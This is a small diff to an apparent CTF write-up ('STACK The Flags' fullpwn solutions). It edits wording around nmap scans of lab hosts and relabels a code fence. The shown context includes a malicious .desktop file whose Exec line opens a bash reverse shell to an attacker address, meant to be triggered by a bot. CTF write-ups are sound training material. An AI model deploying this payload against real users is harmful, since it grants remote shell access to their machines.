@@ -11,7 +11,7 @@ summary: 'Fullpwn Solutions from STACK The Flags CTF'
 
 ### Enumeration
 
-We start with a simple `nmap` scan with the basic options
+We started with a simple `nmap` scan with the basic options
 
 ```bash
 hcue@pjsk:~ » nmap -sC -sV -v 10.129.228.37
@@ -282,7 +282,7 @@ And that’s it \\o/
 
 ### Enumeration
 
-We start with a simple `nmap` scan with the basic options
+We started with a simple `nmap` scan with the basic options
 
 ```bash
 hcue@pjsk:/tmp » nmap -sC -sV 10.129.228.64 -v
@@ -601,7 +601,7 @@ The only exploitation path we can see is that we assume that there is a bot that
 
 To achieve RCE, we will trick the bot into opening our malicious `.desktop` file which will contain our reverse shell
 
-```desktop
+```ini
 [Desktop Entry]
 Exec=bash -c "bash -i >& /dev/tcp/10.10.14.57/443 0>&1"
 Type=Application
